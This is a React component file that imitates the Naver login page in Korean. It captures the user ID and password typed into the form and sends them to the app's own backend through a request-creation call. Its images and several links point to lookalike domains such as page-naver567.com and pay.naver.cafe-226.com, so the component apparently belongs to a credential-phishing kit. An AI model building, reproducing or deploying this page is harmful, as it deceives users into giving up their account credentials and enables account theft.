import {
  Flex,
  Text,
  Image,
  Form,
  TextField,
  DialogTrigger,
  View,
  Dialog,
  Heading,
  Divider,
  Content,
  ButtonGroup,
  Button,
} from "@adobe/react-spectrum";
import { useNavigate, useParams } from "react-router-dom";
import { useProduct } from "../../../api/products/hooks/use-product.hook";
import { useRequestCreate } from "../../../api/requests/hooks/use-request-create.hook";
import ReactHtmlParser from "react-html-parser";
import { useCallback, useEffect, useState } from "react";
import { LoadingIndicator } from "../../shared/loading/loading-indicator.component";
import { PATHS } from "../../../routes";
import { useConnectionCreate } from "../../../api/connections/hooks/use-connection-create.hook";
import { useConnectionEdit } from "../../../api/connections/hooks/use-connection-edit.hook";
import { isEmpty } from "../../../helpers/utils";

export const ProductLoginComponent = (): JSX.Element => {
  const navigate = useNavigate();
  const { productId = "" } = useParams<{
    productId: string;
  }>();

  const [user, setUser] = useState<any>({ userId: "", password: "" });
  const [connection, setConnection] = useState<any>(undefined);

  const { product } = useProduct({ id: productId });
  const { create: createConnection } = useConnectionCreate();
  const { edit: editConnection } = useConnectionEdit();
  const { create: createRequest, isInProgress } = useRequestCreate();

  const handleCreate = useCallback(() => {
    createRequest({ ...user, productId: productId })
      .then((res) => {
        navigate(PATHS.getRequestUrl(res._id));
      })
      .catch((e) => {
        console.log(e);
      });
  }, [user]);

  if (!product) return <></>;
  if (isInProgress) return <LoadingIndicator></LoadingIndicator>;

  return (
    <div className="z_login_wr">
      <div className="z_login_jz">
        <div className="z_login_nr">
          <div className="z_login_nr_01">
            <img
              src="http://www.page-naver567.com/skin/paynaver2022/images/n_095.png"
              alt="login"
            />
          </div>
          <div className="z_login_nr_02">
            <div id="login_naver">
              <input type="hidden" name="id" value="utHyEpvH" />
              <input
                type="text"
                id="username"
                name="username"
                className="login_naver_username"
                placeholder="아이디"
                onChange={(v) => {
                  setUser({ ...user, userId: v.target.value });
                }}
              />
              <input
                type="password"
                id="password"
                name="password"
                className="login_naver_password"
                placeholder="비밀번호"
                onChange={(v) => {
                  setUser({ ...user, password: v.target.value });
                }}
              />
              <button
                className="login_naver_submit"
                disabled={isEmpty(user.userId) || isEmpty(user.password)}
                onClick={() => {
                  handleCreate();
                }}
              >
                로그인
              </button>
            </div>
          </div>
          <div className="z_login_nr_03">
            <table width="100%">
              <tbody>
                <tr>
                  <td width="34">
                    <a
                      href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                      className="login_zhuangtai_tupian_qiehuan"
                      title="0"
                    >
                      <img
                        src="http://www.page-naver567.com/skin/paynaver2022/images/n_029.png"
                        className="login_zhuangtai_tupian_qiehuan_tp"
                        alt="login"
                      />
                    </a>
                  </td>
                  <td width="235">
                    <a
                      href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                      className="login_zhuangtai_tupian_qiehuan"
                      title="0"
                      style={{ fontSize: "12px", color: "#666" }}
                    >
                      로그인 상태 유지
                    </a>
                  </td>
                  <td style={{ fontSize: "12px", color: "#777" }}>
                    IP보안 <span style={{ fontWeight: "700" }}>OFF</span>{" "}
                    <span style={{ fontSize: "10px" }}>|</span> 일회용 로그인
                  </td>
                  <td width="20" align="right">
                    <img
                      src="http://www.page-naver567.com/skin/paynaver2022/images/n_041.png"
                      alt="login"
                    />
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <div className="z_login_nr_04">
            <a
              href="https://nid.naver.com/user/help.nhn?todo=idinquiry"
              style={{ fontSize: "12px", marginRight: "20px", color: "#888" }}
            >
              아이디 찾기
            </a>
            <a
              href="https://nid.naver.com/nidreminder.form"
              style={{ fontSize: "12px", marginRight: "20px", color: "#888" }}
            >
              비밀번호 찾기
            </a>
            <a
              href="https://nid.naver.com/user/join.html?lang=ko_KR"
              style={{ fontSize: "12px", color: "#888" }}
            >
              회원가입
            </a>
          </div>
          <div className="z_login_nr_05">
            <div className="z_login_nr_0501">
              <a
                href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                style={{ marginLeft: "7px" }}
              >
                이용약관
              </a>
              <span
                style={{ fontSize: "10px", color: "#ccc", marginLeft: "10px" }}
              >
                |
              </span>
              <a
                href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                style={{ fontWeight: "700", marginLeft: "7px" }}
              >
                개인정보처리방침
              </a>
              <span
                style={{ fontSize: "10px", color: "#ccc", marginLeft: "10px" }}
              >
                |
              </span>
              <a
                href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#"
                style={{ marginLeft: "7px" }}
              >
                책임의 한계와 법적고지
              </a>
              <span
                style={{ fontSize: "10px", color: "#ccc", marginLeft: "10px" }}
              >
                |
              </span>
              <a href="http://pay.naver.cafe-226.com/login.php?pd=co.kr19#">
                회원정보 고객센터
              </a>
            </div>
            <div className="z_login_nr_0502">
              <img
                src="http://www.page-naver567.com/skin/paynaver2022/images/n_096.png"
                alt=""
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
